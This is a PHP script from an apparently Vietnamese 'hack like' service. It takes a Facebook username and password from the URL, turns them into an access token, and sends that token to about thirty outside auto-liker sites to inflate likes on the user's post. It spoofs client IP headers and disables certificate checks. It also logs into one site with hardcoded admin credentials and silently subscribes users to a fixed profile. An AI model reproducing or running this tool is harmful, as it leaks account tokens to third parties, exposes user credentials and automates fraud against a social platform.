<meta charset="UTF-8">
<meta http-equiv="refresh" content="1">
<?php
include'../head.php';
include'vip.php';
?>
<title>Đang Hack Like</title>
<?php
set_time_limit(0);
 error_reporting(0);
  class bcs
{

   public $id;
private function get_html($url) {
	$cookies = dirname(__FILE__).'/liker.txt';
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);  
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 2);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = trim(curl_exec($ch));
    curl_close($ch);
	return $data;
}
 private function Submit($url,$fields)
    {
		$random_IP = "".mt_rand(0,255).".".mt_rand(0,255).".".mt_rand(0,255).".".mt_rand(0,255);
		$cookies = dirname(__FILE__).'/liker.txt';
		$field_string = http_build_query($fields);
		$ch = curl_init();
		curl_setopt($ch,CURLOPT_URL,$url);
		curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
                curl_setopt($ch,CURLOPT_FRESH_CONNECT,true);
                curl_setopt($ch,CURLOPT_TCP_NODELAY,true);
		curl_setopt($ch,CURLOPT_HTTPHEADER,array("REMOTE_ADDR: $random_IP", "HTTP_X_FORWARDED_FOR: $random_IP"));		
		curl_setopt($ch,CURLOPT_REFERER,$url);          
		curl_setopt($ch,CURLOPT_TIMEOUT,5);		
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 10.0; rv:49.0) Gecko/20100101 Firefox/49.0');
		curl_setopt($ch,CURLOPT_COOKIEFILE,$cookies);
		curl_setopt($ch,CURLOPT_COOKIEJAR,$cookies);
		curl_setopt($ch, CURLOPT_POST, count($field_string));
		curl_setopt($ch,CURLOPT_POSTFIELDS,$field_string);   
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$body = curl_exec($ch);
		if(!curl_errno($ch)){
		$info = curl_getinfo($ch);
		$redir = $info['redirect_url'];
		$code = $info['http_code'];
		curl_close($ch);
		return "<br>".$redir;
		}
   }
// bắt đầu
private function vipliketay01($tok)
		{
                $II = "".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Send Likes",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);         
        }
			private function vipliketay02($tok)
		{
                $II = "http://auto-fb-tools.com/verify.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://auto-fb-tools.com/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);         
        }
			private function vipliketay03($tok)
		{
			$II = "http://www.royaliker.net/verify.php?user=".$tok;
			$III = array(
			"captcha" => "",
			"submit" => "Continue!",
			);
			$IIII = "http://www.royaliker.net/liker.php?type=custom";
			$IIIII = array(
			"id" => $this->id,
			"submit" => "Submit",
			"IL_IN_TAG" => "2",
			);
			echo $this->Submit($II,$III);
			echo $this->Submit($IIII,$IIIII);	
		}
			private function vipliketay04($tok)
		{
                $II = "http://fblikeaddicts.com/test2/Go.login.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://fblikeaddicts.com/test2/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);          
        }
			private function vipliketay05($tok)
		{
				$II = "".$tok;
				$III = array(
				"answer" => "",
				"submit" => "Continue",
				);
				$IIII = "";
				$IIIII = array(
				"id" => $this->id,
				"submit" => "Send Likes",
				"IL_IN_TAG" => "2",
				);
				echo $this->Submit($II,$III);
				echo "<br>";
				echo $this->Submit($IIII,$IIIII);
				echo "<br>";
				echo "<hr><hr>";	
		}
			private function vipliketay06($tok)
		{
                $II = "http://likebuck.net/login.php?access_token=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://likebuck.net/likes.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);       
        }
			private function vipliketay07($tok)
		{
                $II = "http://postlikes.in/login.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://postlikes.in/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);         
        }
			private function vipliketay08($tok)
		{
                $II = "http://hublaalike.com/verify.php";
                $III = array(
                "user" => $tok,
                );
                $IIII = "http://hublaalike.com/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);     
        }
private function vipliketay09($tok)
		{
                $II = "http://autolike-us.com/verify.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://autolike-us.com/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);          
        }
			private function vipliketay10($tok)
		{
                $II = "http://likelo.in/login.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://likelo.in/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);        
        }
			private function vipliketay11($tok)
		{
                $II = "http://foxliker.net/login.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://foxliker.net/like.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
				"selector" => "200",
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);          
        }
			private function vipliketay12($tok)
		{
                $II = "http://www.fb-likers.com/mylogin.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://www.fb-likers.com/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
				"yourlimitpost" => "00001,00010000",
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);
        }
			private function vipliketay13($tok)
		{
			$II = "http://fbautolikerapp.com/Access.php";
			$III = array(
			"pass" => $tok,
			);
			$IIII = "http://fbautolikerapp.com/dashboard.php?type=custom";
			$IIIII = array(
			"id" => $this->id,
			"submit" => "Submit",
			);
			echo $this->Submit($II,$III);
			echo $this->Submit($IIII,$IIIII);
		}
			private function vipliketay14($tok)
		{
                $II = "http://www.on-liker.com/verify.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://www.on-liker.com/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);     
        }
			private function vipliketay15($tok)
		{
                $II = "http://autolikerfb.in/login.php?access_token=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://autolikerfb.in/?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);    
        }
private function vipliketay16($tok)
		{
                $II = "http://www.hmliker.com/verify.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://www.hmliker.com/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);         
        }
			private function vipliketay17($tok)
		{
                $II = "http://www.sexyliker.com/login.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://www.sexyliker.com/likes.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
				"count" => "50",
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);     
        }
			private function vipliketay18($tok)
		{
                $II = "http://grandliker.in/login.php?accesstoken=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://grandliker.in/customliker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "AUTO LIKE",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);      
        }
			private function vipliketay19($tok)
		{
                $II = "http://www.autolikerforfb.com/login.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://www.autolikerforfb.com/like.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
				"submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);          
        }
			private function vipliketay20($tok)
		{
                $II = "http://vipliker.me/loginx.php";
                $III = array(
                "user" => $tok,
				"masuk" => "Submit",
                );
                $IIII = "http://vipliker.me/liker.php?type=status";
                $IIIII = array(
                "access_login" => "admin",
                "access_password" => "123456",
				"Submit" => "Countinue",
                );
				$IIIIII = "http://vipliker.me/liker.php?type=custom";
                $IIIIIII = array(
                "id" => $this->id,
				"pancal" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);
				echo $this->Submit($IIIIII,$IIIIIII);         
        }
private function vipliketay21($tok)
		{		
				$IIX = "http://oficial.likelo.com.br/index.php";
                $II = "http://oficial.likelo.com.br/verify.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://oficial.likelo.com.br/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);          
        }
			private function vipliketay22($tok)
		{
                $II = "http://www.balkan-autoliker.com/index.php";
                $III = array(
                "token" => $tok,
                );
                $IIII = "http://www.balkan-autoliker.com/custom.php";
                $IIIII = array(
                "postid" => $this->id,
				"br_lajkova" => "00001,00010000",
                "submit" => "Like",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);         
        }
			private function vipliketay23($tok)
		{
                $II = "http://autolikerbrasil.net/verificar.php?usuario=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://autolikerbrasil.net/liker.php?id=IDpersonalizado";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Enviando Likes",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);          
        }
			private function vipliketay24($tok)
		{
                $II = "http://nobteam.com/101like/verify.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://nobteam.com/101like/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Plus Like",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);      
        }
			private function vipliketay25($tok)
		{
                $II = "http://autolikerfb.com/login.php";
                $III = array(
                "token" => $tok,
                );
                $IIII = "http://autolikerfb.com/like.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);          
		}
			private function vipliketay26($tok)
		{
                $II = "http://www.superlike.net/login.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://www.superlike.net/Likes.php?type=custom&lang=en";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);         
        }
private function vipliketay27($tok)
		{
                $II = "".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "";
                $IIIII = array(
                "id" => $this->id,
				"access_token" => $tok,
                "pancal" => "StartLike",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);         
        }
			private function vipliketay28($tok)
		{
                $II = "http://autoliker4fb.com/verified.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://autoliker4fb.com/dashboard.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);         
        }
			private function vipliketay29($tok)
		{
                $II = "http://hufba.com/logins.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://hufba.com/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);          
        }
			private function vipliketay30($tok)
		{
                $II = "http://freelikesnow.net/verify.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://freelikesnow.net/liker.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "Submit",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);        
        }
			private function vipliketay31($tok)
		{
                $II = "http://www.moelikes.net/login.php?access_token=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://www.moelikes.net/?type=custom";
                $IIIII = array(
                "id" => $this->id,
				"limit" => "200",
                "pancal" => "SUBMIT",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);       
        }
			private function vipliketay32($tok)
		{
                $II = "http://hacklike24h.com/login.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
                $IIII = "http://hacklike24h.com/hack-like.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "AutoLike",
                );
				$IIIIII = "http://hacklike24h.com/hack-friend.php?type=custom";
				$IIIIIII = array(
				"id" => "100009905380221",
				"submit" => "Auto Sub",
				);
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);
				echo $this->Submit($IIIIII,$IIIIIII);        
        }
private function vipliketay33($tok)
		{
                $II = "http://hacklikes.net/login.php?user=".$tok;
                $III = array(
                "null" => "null",
                );
				$IIIX = "http://hacklikes.net/like.php?user=".$tok;
                $IIII = "http://hacklikes.net/autolike.php?type=custom";
                $IIIII = array(
                "id" => $this->id,
                "submit" => "AutoLike",
                );
                echo $this->Submit($II,$III);
                echo $this->Submit($IIII,$IIIII);        
        }

 public function vn($tok)
	{
  ignore_user_abort(true);
	while (@ob_end_flush());      
	ob_implicit_flush(true);
$fp = fopen('liker.txt', 'w ');
fclose($fp);	
                echo $this->vipliketay33($tok);
		echo $this->vipliketay32($tok);
		echo $this->vipliketay31($tok);
		echo $this->vipliketay30($tok);
		echo $this->vipliketay29($tok);
		echo $this->vipliketay28($tok);
		echo $this->vipliketay27($tok);
		echo $this->vipliketay26($tok);
		echo $this->vipliketay25($tok);
		echo $this->vipliketay24($tok);
		echo $this->vipliketay23($tok);
		echo $this->vipliketay22($tok);
		echo $this->vipliketay21($tok);
		echo $this->vipliketay20($tok);
		echo $this->vipliketay19($tok);
		echo $this->vipliketay18($tok);
		echo $this->vipliketay17($tok);
		echo $this->vipliketay16($tok);
        echo $this->vipliketay16($tok);
		echo $this->vipliketay15($tok);
		echo $this->vipliketay14($tok);
		echo $this->vipliketay13($tok);
		echo $this->vipliketay12($tok);
		echo $this->vipliketay11($tok);
		echo $this->vipliketay10($tok);
		echo $this->vipliketay09($tok);
		echo $this->vipliketay08($tok);	
		echo $this->vipliketay07($tok);
		echo $this->vipliketay06($tok);
		echo $this->vipliketay05($tok);
		echo $this->vipliketay04($tok);
		echo $this->vipliketay02($tok);
		echo $this->vipliketay01($tok);
 }
}
include'config.php';
$uid = $_GET['idf'];
$user = $_GET['u'];
$pass = $_GET['p'];
 $token= file_get_contents(''.$domain.'/token/htc.php?laytoken=ok&user='.urlencode($user).'&pass='.urlencode($pass).'');
$feed=json_decode(file_get_contents('https://graph.fb.me/'.$uid.'/feed?access_token='.$token.'&limit=1'),true); 
for($i=0;$i<count($feed['data']);$i++){ // Parse ID
$id = $feed['data'][$i]['id'];  
$sllike = $feed['data'][$i]['likes']['count']; 
} 
 $try = new bcs;
if(in_array($uid,$vip))
        {
            echo '<center>Bạn Đăng Là <b color="green">User Vip </b></center><br>';
        }else if($sllike >= 5000) {
echo "Số Like Hiện Tại Là : " .$sllike. "<br>";
die("<b>LỖI: </b>Số Like Vượt Quá Giới Hạn Người Dùng<br>Xin Hãy Đăng Kí Gói User Vip Để Nhận Nhiều Like Hơn Nữa<br><a href=http://m.me/kundz.vn><b><u>Click Vào Đây Để Hỗ Trợ Đăng Kí User Vip</b></u></a>");
}
$stt = explode("_", $id);
$iduser= $stt[0];
$post_id= $stt[1];
if(!$post_id){
	echo "Không Xác Đinh Được ID Người Dùng Này ! Hãy Vui Lòng Kiểm Tra Lại<br>";
}else{
echo "Đang Hack Cho User: " .$uid. "<br>" ;
echo "ID Status : " .$post_id. "</br>" ;
if(isset($sllike)) echo "Số like hiện tại: " .$sllike. "<br>" ;
echo "<hr><hr> ";	
$try->id = $post_id;
$try->vn($token); 
} 
?>